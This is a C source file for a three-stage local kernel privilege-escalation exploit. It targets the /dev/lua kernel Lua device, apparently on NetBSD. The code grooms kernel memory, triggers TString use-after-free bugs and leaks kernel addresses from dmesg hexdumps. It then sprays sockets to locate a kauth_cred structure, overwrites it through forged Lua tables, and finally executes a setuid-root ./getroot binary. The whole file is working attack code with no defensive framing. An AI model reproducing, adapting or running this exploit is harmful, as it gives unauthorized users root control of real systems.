#include <err.h>
#include <pwd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <paths.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <regex.h>
#include <stdbool.h>
#include <assert.h>
#include <ctype.h>

#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/ioctl.h>
#include <sys/lua.h>
#include <sys/wait.h>

#define TESTING   0
#define DMESG     "/sbin/dmesg"

typedef struct exploit_state {
  int devfd;
  double logstart;
  char * username;
  char * mainstate;
  char * stage2_state;
  char * consumemem_state;
  char * stage3_state;
  int * sockets;
  size_t nsockets;
  uint64_t tstring_addr;
  uint64_t kauth_cred_addr;
} exploit_state;

// ------------------------------------------------
// ---- Lua Device utils --------------------------
// ------------------------------------------------

void luadev_create(int devfd, const char *name) {
  struct lua_create cr = {0};
  strcpy(cr.name, name);
  if (ioctl(devfd, LUACREATE, &cr)) {
    perror("LUACREATE failed");
    abort();
  }
}

void luadev_require(int devfd, const char *state, const char *module) {
  struct lua_require rq = {0};
  strcpy(rq.state, state);
  strcpy(rq.module, module);
  if (ioctl(devfd, LUAREQUIRE, &rq)) {
    perror("LUAREQUIRE failed");
    abort();
  }
}

void luadev_load(int devfd, const char *state, const char *path) {
  struct lua_load ld = {0};
  strcpy(ld.state, state);
  strncpy(ld.path, path, MAXPATHLEN);
  if (ioctl(devfd, LUALOAD, &ld)) {
    perror("LUALOAD failed");
    abort();
  }
}

void luadev_destroy(int devfd, const char *name) {
  struct lua_create cr = {0};
  strcpy(cr.name, name);
  if (ioctl(devfd, LUADESTROY, &cr)) {
    perror("LUADESTROY failed");
    abort();
  }
}

// ------------------------------------------------
// ---- System log utils --------------------------
// ------------------------------------------------

typedef struct slog_line {
  double timestamp;
  const char *contents;
} slog_line;

typedef struct slog_hexdump {
  char *label;
  double timestamp;
  size_t len;
  uint8_t *res;
} slog_hexdump;

char slog_buf[0x1000];
regex_t slog_regexline;
regex_t slog_regexlabel;

void slog_init() {
  int status;
  status = regcomp(&slog_regexline, 
                   "\\[ *([0-9]+\\.[0-9]+)\\] ([^\n]+)", 
                   REG_EXTENDED);

  if (status != 0) {
    dprintf(2, "Failed to compile regexline: %d\n", status);
    abort();
  }

  status = regcomp(&slog_regexlabel, 
                   "label=([A-Za-z0-9]+)", 
                   REG_EXTENDED);

  if (status != 0) {
    dprintf(2, "Failed to compile regexlabel: %d\n", status);
    abort();
  }
}

FILE *slog_open(void) {
  FILE *fp = popen(DMESG, "r");
  if (!fp) {
    perror("Failed to run dmesg");
    abort();
  }
  return fp;
}

void slog_close(FILE *fp) {
  pclose(fp);
}

void slog_free_hexdump(slog_hexdump *hexdump) {
  free(hexdump->res);
  free(hexdump);
}

double slog_parse_double(const char *s) {
  char *endptr = NULL;
  double res = strtod(s, &endptr);
  assert(endptr != s);
  return res;
}

int slog_parse_line(const char *line, slog_line *out) {
  regmatch_t matches[3];
  int status = regexec(&slog_regexline, line, 3, matches, 0);

  switch(status) {
    case 0: {
      size_t len = matches[2].rm_eo - matches[2].rm_so;
      out->timestamp = slog_parse_double(line + matches[1].rm_so);
      out->contents = strndup(line + matches[2].rm_so, len);
      return 0;
    }
    case REG_NOMATCH:
      return -1;
    default:
      dprintf(2, "slog_parse_line: regexec unexpected error: %d\n", status);
      abort();
  }
}

char * slog_parse_label(const char *s) {
  regmatch_t matches[2];
  int status = regexec(&slog_regexlabel, s, 2, matches, 0);
  if (status != 0) {
    dprintf(2, "Failed to parse hexdump label: %d\n", status);
    abort();
  }
  return strndup(s + matches[1].rm_so, matches[1].rm_eo - matches[1].rm_so);
}

uint8_t slog_parse_hex(const char *s) {
  char *endptr = NULL;
  unsigned long int x = strtoul(s, &endptr, 16);
  assert(endptr == s + 2);
  return (uint8_t) x;
}

void slog_parse_hexdump(const char *s, uint8_t *out) {
  int i;

  if (strlen(s) < 23) {
    dprintf(2, "Malformed hexdump line: %s\n", s, strlen(s));
    abort();
  }

  for (i = 0; i < 8; i++) {
    out[i] = slog_parse_hex(s); 
    s = s + 3;
  }
}

slog_hexdump * slog_process_hexdump(FILE *fp, char *label, double timestamp) {
  int i = 0;
  size_t avail = 1024;
  int status;
  const char *line;
  slog_line pline;
  slog_hexdump *hexdump = malloc(sizeof(slog_hexdump));
  
  hexdump->label = label;
  hexdump->timestamp = timestamp;
  hexdump->res = calloc(1, avail);

  // We've seen BEGIN, now fetch all hex content until END
  while (line = fgets(slog_buf, sizeof(slog_buf), fp)) {
    status = slog_parse_line(line, &pline);
    if (status)
      continue;

    if (strstr(line, "@@@END-HEXDUMP")) {
      goto done;
    }

    if (i + 8 > avail) {
      avail *= 2;
      hexdump->res = realloc(hexdump->res, avail);
    }

    slog_parse_hexdump(pline.contents, hexdump->res + i);
    i += 8;
  }

  dprintf(2, "Did not see @@@END-HEXDUMP\n");
  free(hexdump);
  return NULL;

done:
  hexdump->len = i;
  return hexdump;
}

slog_hexdump * slog_retrieve_hexdump(FILE *fp, const char *label, double after_ts) {
  const char *line;
  int status;
  regmatch_t matches[3];
  slog_hexdump *res = NULL;
  slog_line pline;
  slog_line lpline = {0};
  char *nlabel;

  // We always scan to the end of the buffer to deal with dmesg entries from last boot
  // with invalid timestamps

  while (line = fgets(slog_buf, sizeof(slog_buf), fp)) {
    status = slog_parse_line(line, &pline);
    if (status || pline.timestamp <= after_ts)
      continue;
    
    if (pline.timestamp < lpline.timestamp && res) {
      slog_free_hexdump(res);
      res = NULL;
    }

    if (strstr(pline.contents, "@@@BEGIN-HEXDUMP")) {
      nlabel = slog_parse_label(pline.contents);

      if (strcmp(nlabel, label) == 0) {
        if (res)
          slog_free_hexdump(res);

        res = slog_process_hexdump(fp, nlabel, pline.timestamp);
      }
    }

    lpline = pline;
  }

  return res;
}

// ------------------------------------------------
// ---- Misc. utils -------------------------------
// ------------------------------------------------

typedef struct meminfo {
  uint64_t total;
  uint64_t used;
  uint64_t free;
} meminfo;

void parse_meminfo(char *s, size_t len, meminfo *out) {
  int i;
  char *content;
  char *ncontent;
  int state = 1;

  //         total:    used:    free:  shared: buffers: cached:
  // Mem:  1012412416 90435584 921976832        0 35299328 55705600

  if ((content = strstr(s, "Mem:")) == NULL) 
    goto error;

  content += sizeof("Mem:");
  while (++content < s + len) {
    char c = *content;

    switch(c) {
      case ' ':
        continue;
      case '\n':
        goto error;
      default: {
        uint64_t value = strtoul(content, &ncontent, 10);

        if (content == ncontent)
          goto error;

        content = ncontent;
        switch(state++) {
          case 1:
            out->total = value;
            break;
          case 2:
            out->used = value;
            break;
          case 3:
            out->free = value;
            return;
        }
      }   
    }
  }

error:
  dprintf(2, "Failed to parse /proc/meminfo:\n%s\n", s);
  abort();
}

void get_meminfo(meminfo *out) {
  char buf[0x100];
  ssize_t len;
  int fd = open("/proc/meminfo", O_RDONLY);

  if (fd == -1) {
    dprintf(2, "Failed to open to /proc/meminfo\n");
    abort();
  }

  len = read(fd, buf, sizeof(buf));
  if (len == -1) {
    dprintf(2, "Failed to read /proc/meminfo\n");
    abort();
  }

  buf[MIN(len, sizeof(buf) - 1)] = '\0';
  parse_meminfo(buf, len, out);
  close(fd);
}

double uptime() {
  char buf[0x40];
  ssize_t len;
  int fd;
  char *endptr;
  double res;

  if ((fd = open("/proc/uptime", O_RDONLY)) == -1) {
    dprintf(2, "Failed to open to /proc/uptime\n");
    abort();
  }

  len = read(fd, buf, sizeof(buf));
  if (len == -1) {
    dprintf(2, "Failed to read /proc/uptime\n");
    abort();
  }

  buf[MIN(len, sizeof(buf) - 1)] = '\0';
  res = strtod(buf, &endptr);
  assert(endptr != buf);
  close(fd);
  return res;
}

char * readfile(const char *path) {
  struct stat sb;
  char *buf;
  int fd; 
  
  if ((fd = open(path, O_RDONLY)) == -1) {
    printf("[-] Failed to open file: %s\n", path);
    abort();
  }

  if (fstat(fd, &sb)) {
    perror("[-] fstat failed");
    abort();
  }

  buf = malloc(sb.st_size);
  read(fd, buf, sb.st_size);
  close(fd);
  return buf;
}

// ------------------------------------------------
// ---- Stage1 ------------------------------------
// ------------------------------------------------

typedef struct stage1_target {
  uint64_t allocsz;
  uint64_t addr;
  uint64_t tag;
} stage1_target;

void stage1_overwrite_uaf(int devfd) {
  int i;
  struct lua_create cr = {0};

  for (i = 1; i <= 0x20; i++) {
    memset(&cr, 0xff, sizeof(struct lua_create));
    cr.name[0] = 'a' + i;
    if (ioctl(devfd, LUACREATE, &cr)) {
      perror("LUACREATE overwrite failed");
      abort();
    }
  } 
}

void stage1_cleanup(int devfd) {
  int i;
  struct lua_create cr = {0};

  for (i = 1; i <= 0x20; i++) {
    memset(&cr.name, 0xff, sizeof(cr.name) - 1);
    cr.name[0] = 'a' + i;
    if (ioctl(devfd, LUADESTROY, &cr)) {
      perror("LUADESTROY failed");
      abort();
    }
  } 
}

uint64_t stage1_retrieve_addr(double logstart) {
  int i;
  uint64_t addr;
  uint8_t tag;
  uint64_t allocsz;
  slog_hexdump *hexdump;
  FILE *fp = slog_open();

  hexdump = slog_retrieve_hexdump(fp, "STAGE1", logstart);

  for (i = 0; i + sizeof(stage1_target) <= hexdump->len; i += 8) {
    stage1_target * scan = (stage1_target *) (hexdump->res + i);

    if (scan->allocsz == 0x78 && 
        (scan->tag & 0xff )== 0x54 &&
        (scan->addr & 0xffff000000000000) == 0xffff000000000000) {
      
      addr = scan->addr;
      goto done;
    }
  }

  printf("[-] Could not find TString array\n");
  abort();
done:
  slog_free_hexdump(hexdump);
  slog_close(fp);
  return addr;
}

void stage1(exploit_state *state) {
  printf("[+] Grooming kmem...\n");
  luadev_load(state->devfd, state->mainstate, "./stage1-groom.lua");

  printf("[+] Creating TString UAF...\n");
  luadev_load(state->devfd, state->mainstate, "./stage1-freestring.lua");

  printf("[+] Overwriting UAF...\n");
  stage1_overwrite_uaf(state->devfd);

  printf("[+] Leaking address...\n");
  luadev_load(state->devfd, state->mainstate, "./stage1-dumpstring.lua");

  printf("[+] Cleaning up...\n");
  stage1_cleanup(state->devfd);

  state->tstring_addr = stage1_retrieve_addr(state->logstart);
  printf("[+] TString address: %lx\n", state->tstring_addr);
}

// ------------------------------------------------
// ---- Stage2 ------------------------------------
// ------------------------------------------------

#define NBATCH        28
#define NSOCKETS      7 * 0x20 * 4

bool stage2_consume_memory(exploit_state *state) {
  bool reduced = false;
  meminfo info;
  size_t target = 800 * 0x1000;

  get_meminfo(&info);
  dprintf(2, "[+] Reducing memory: target=%lx, avail=%lx\n", target, info.free);

  while (info.free > target) {
    luadev_load(state->devfd, 
                state->consumemem_state, 
                "./stage2-consumemem.lua");
              
    get_meminfo(&info);
    reduced = true;
  }

  dprintf(2, "[+] Available memory: %lx\n", info.free);
  return reduced;
}

void stage2_release_memory(exploit_state *state) {
  luadev_destroy(state->devfd, state->consumemem_state);
}

int stage2_retrieve_addr(exploit_state *state, uint64_t *out) {
  FILE *fp;
  slog_hexdump *hexdump; 
  int ret = 0;

  fp = slog_open();
  hexdump = slog_retrieve_hexdump(fp, "STAGE2", state->logstart);

  if (!hexdump) {
    dprintf(2, "[-] Failed to retrieve STAGE2 hexdump\n");
    ret = -1;
    goto exit;
  }

  *out =  ((uint64_t *) hexdump->res)[68];
  slog_free_hexdump(hexdump);
exit:
  slog_close(fp);
  return ret;
}

int stage2_overwrite_uaf(exploit_state *state, size_t n) {
  int w = 0;
  int i = 0;
  int fd;
  int status;
  int *prev_fds = calloc(NSOCKETS, sizeof(int));
  int *fds = calloc(NBATCH, sizeof(int));
  struct linger l = { .l_onoff=1, .l_linger=0xd3ad };

  for (w = 0; w < n; w += NBATCH) {
    printf("[+] Spraying sockets: w=%d\n", w);

    for (i = 0; i < NBATCH; i++) {
      fd = socket(PF_LOCAL, SOCK_STREAM, 0);
      assert(fd != -1);
      setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(struct linger));
      fds[i] = fd;    
    }

    // Try to unload
    printf("[+] Checking for kauth_cred address\n");
    luadev_load(state->devfd, state->stage2_state, "./stage2-dumpstrings.lua");

    status = stage2_retrieve_addr(state, &state->kauth_cred_addr);
    if (status == 0) {
      printf("[+] Found kauth_cred address: %lx\n", state->kauth_cred_addr);
      state->sockets = fds;
      state->nsockets = NBATCH;
      break;
    }

    printf("[-] No match, trying again...\n");
    memcpy(prev_fds + w, fds, sizeof(*fds) * NBATCH);
  }

  for (i = 0; i < NSOCKETS; i++) {
    if (prev_fds[i] == 0)
      break;
    close(prev_fds[i]);
  }

  if (status != 0)
    free(fds);
  free(prev_fds);
  return status;
}

void stage2(exploit_state *state) {
  int status;
  uint64_t addr;

  while (true) {
    int i = 0;

    printf("[+] Setting up lua state\n");
    luadev_create(state->devfd, state->stage2_state);
    luadev_require(state->devfd, state->stage2_state, "systm");
#if TESTING == 1
    luadev_require(state->devfd, state->stage2_state, "util");
#endif

    luadev_load(state->devfd, state->stage2_state, "./libexploit.lua");
    luadev_load(state->devfd, state->stage2_state, "./libgc.lua");
    luadev_load(state->devfd, state->stage2_state, "./stage2.luac");

    printf("[+] Reducing available memory...\n");
    luadev_create(state->devfd, state->consumemem_state);

    while (i++ < 6) {
      stage2_consume_memory(state);
      sleep(2);
    }

    printf("[+] Creating UAFs...\n");
    luadev_load(state->devfd, state->stage2_state, "./stage2-freestrings.lua");

    printf("[+] Waiting for uvmpd to reclaim pages...\n");
    sleep(9);

    printf("[+] Overwriting UAF with sockets\n");
    status = stage2_overwrite_uaf(state, NSOCKETS);

    printf("[+] Releasing memory...\n");
    stage2_release_memory(state);
    luadev_destroy(state->devfd, state->stage2_state);

    if (status == 0) {
      printf("[+] kauth_cred address: %lx\n", state->kauth_cred_addr);
      return;
    }
  }
}

// ------------------------------------------------
// ---- Stage3 ------------------------------------
// ------------------------------------------------

volatile sig_atomic_t stage3_done = 0;

void stage3_signal_handler(int signo) {
  stage3_done = 1;
}

void stage3_release_sockets(exploit_state *state) {
  int i;
  for (i = 0; i < state->nsockets; i++) {
    close(state->sockets[i]);
  }
  free(state->sockets);
  state->sockets = NULL;
}

int strformat_int8(uint8_t value, char *buf, size_t len) {
  return snprintf(buf, len, "\\x%02hhx", value);
}

int strformat_int32(uint32_t value, char *buf, size_t len) {
  int i;
  int offset = 0;
  for (i = 0; i < 4; i++)
    offset += strformat_int8(value >> (i * 8), buf + offset, len - offset);
  return offset;
}

int strformat_int64(uint64_t value, char *buf, size_t len) {
  int i;
  int offset = 0;
  for (i = 0; i < 8; i++)
    offset += strformat_int8(value >> (i * 8), buf + offset, len - offset);
  return offset;
}

int strformat_table(uint64_t addr, char *buf, size_t len) {
  int off = 0;
  off += strformat_int64(0x00, buf, len);               // next
  off += strformat_int8(0x84, buf + off, len - off);    // tt
  off += strformat_int8(0x00, buf + off, len - off);    // marked
  off += strformat_int8(0x00, buf + off, len - off);    // flags
  off += strformat_int8(0x00, buf + off, len - off);    // lsizenode
  off += strformat_int32(0x01, buf + off, len - off);   // alimit
  off += strformat_int64(addr, buf + off, len - off);   // array
  off += strformat_int64(0x0, buf + off, len - off);    // node
  off += strformat_int64(0x0, buf + off, len - off);    // lastfree
  off += strformat_int64(0x0, buf + off, len - off);    // metatable
  off += strformat_int64(0x0, buf + off, len - off);    // gclist
  return off;
}

int strformat_tvalue(uint64_t value, uint64_t tag, char *buf, size_t len) {
  int off = 0;
  off += strformat_int64(value, buf, len);
  off += strformat_int64(tag, buf + off, len - off);
  return off;
}

void stage3_prepare_forgetables(uint64_t kauth_cred_addr) {
  int i;
  int fd;
  size_t rem;
  int off = 0;
  uint64_t kauth_cred;
  size_t len = 4055 * 4;
  char *fmt;
  char *str = malloc(len);
  char *pad = malloc(0x1000);

  // The page is used exclusively for kauth_cred allocations, so we
  // overwrite all entries that may be on the page

  kauth_cred = (kauth_cred_addr & ~0xfff) + 0x40;

  for (i = 0; i < 21; i++) {
    off += strformat_table(kauth_cred + 0x40, str + off, len - off);
    kauth_cred += 0xc0;
  }

  // Increase the size of the Lua string to fit allocation size 4096

  rem = (len - off) / 4;
  memset(pad, 'Q', rem);
  pad[rem] = '\0';

  if ((fd = open("./stage3-forgetables.lua", O_CREAT | O_WRONLY | O_TRUNC, 0755)) == -1) {
    dprintf(2, "Failed to open stage3-forgetables.lua\n");
    abort();
  }

  fmt = readfile("./stage3-forgetables.template.lua");
  dprintf(fd, fmt, str, pad);

  close(fd);
  free(str);
  free(pad);
}

void stage3_prepare_overwrite(uint64_t tstring_addr) {
  int i;
  int fd;
  char *fmt;
  char *str;
  size_t rem;
  size_t off = 0;
  size_t len = 0x1000;

  str = calloc(1, len);
  for (i = 0; i < 21; i++) {
    uint64_t addr = tstring_addr + 24 + (i * 56);
    off += strformat_tvalue(addr, 0x45, str + off, len - off);
  }

  rem = 447 - (off / 4);
  memset(str + off, 'X', rem);
  *(str + off + rem) = '\0';

  if ((fd = open("./stage3-overwrite.lua", O_CREAT | O_WRONLY | O_TRUNC, 0755)) == -1) {
    dprintf(2, "Failed to open stage3-overwrite.lua\n");
    abort();
  }

  fmt = readfile("./stage3-overwrite.template.lua");
  dprintf(fd, fmt, str);

  close(fd);
  free(str);
}

pid_t stage3_spawn_processes(exploit_state *state, int n) {
  int i;
  pid_t pid;
  char *args[5];
  char cmd[255];

  snprintf(cmd, sizeof(cmd), "./elevate_worker %s %d %d %d", 
                      state->username, getpid(), 0, n);

  args[0] = "/usr/bin/su";
  args[1] = state->username;
  args[2] = "-c";
  args[3] = cmd;
  args[5] = NULL;

  pid = fork();
  if (pid == 0)
    execv("/usr/bin/su", args);
  else
    printf("[+] Spawned pid=%d\n", pid);

  return pid;
}

void stage3(exploit_state *state) {
  int status;
  pid_t childpid;

  printf("[+] Forging tables...\n");
  stage3_prepare_forgetables(state->kauth_cred_addr);
  luadev_load(state->devfd, state->mainstate, "./stage3-forgetables.lua");

  printf("[+] Preparing state for kauth_cred overwrite...\n");
  stage3_prepare_overwrite(state->tstring_addr);
  luadev_create(state->devfd, state->stage3_state);
  luadev_require(state->devfd, state->stage3_state, "systm");
#if TESTING == 1
  luadev_require(state->devfd, state->stage3_state, "util");
#endif
  luadev_load(state->devfd, state->stage3_state, "./libexploit.lua");
  luadev_load(state->devfd, state->stage3_state, "./libgc.lua");
  luadev_load(state->devfd, state->stage3_state, "./stage1.luac");

  printf("[+] Releasing sockets & spawning processes...\n");
  signal(SIGUSR1, stage3_signal_handler);
  stage3_release_sockets(state);
  childpid = stage3_spawn_processes(state, state->nsockets * 2);

  printf("[+] Waiting for signal...\n");
  while (!stage3_done) {
    usleep(100000);   // 100ms
  }

  printf("[+] Overwriting kauth_cred\n");
  luadev_load(state->devfd,  state->stage3_state, "./stage3-overwrite.lua");

  printf("[+] Waiting for child to complete\n");
  waitpid(childpid, &status, 0);

  printf("[+] Cleaning up...\n");
  luadev_destroy(state->devfd, state->stage3_state);
}

int checksuccess() {
  struct stat sb;

  if (stat("./getroot", &sb)  == -1) {
    printf("[-] Could not stat ./getroot\n");
    return 1;
  }

  if (sb.st_uid != 0) {
    printf("[-] Exploit failed: ./getroot not owned by root\n");
    return 1;
  }

  if ((sb.st_mode & S_ISUID) == 0) {
    printf("[-] Exploit failed: ./getroot mode is not setuid\n");
    return 1;
  }

  return 0;
}

int main(int argc, char **argv, char **envp) {
  struct passwd *pw;
  exploit_state state = {0};

  pw = getpwuid(getuid());

  state.username = strdup(pw->pw_name);
  state.mainstate = "test";
  state.stage2_state = "stage2";
  state.consumemem_state = "consumemem";
  state.stage3_state = "stage3";
  state.logstart = uptime();

  slog_init();

  if ((state.devfd = open("/dev/lua", O_RDWR)) == -1) {
    dprintf(2, "Failed to open /dev/lua\n");
    return 1;
  }

  // Set up our main Lua state
  printf("[+] Setting up Lua state\n");
  luadev_create(state.devfd, state.mainstate);
  luadev_require(state.devfd, state.mainstate, "systm");
#if TESTING == 1
  luadev_require(state.devfd, state.mainstate, "util");
#endif

  printf("[+] Loading dependencies\n");
  luadev_load(state.devfd, state.mainstate, "./libexploit.lua");
  luadev_load(state.devfd, state.mainstate, "./libgc.lua");
  luadev_load(state.devfd, state.mainstate, "./stage1.luac");

  stage1(&state);
  stage2(&state);
  stage3(&state);

  luadev_destroy(state.devfd, state.mainstate);

  if (checksuccess() != 0)
    return 1;

  printf("[+] Executing ./getroot\n");
  return execv("./getroot", argv);
}
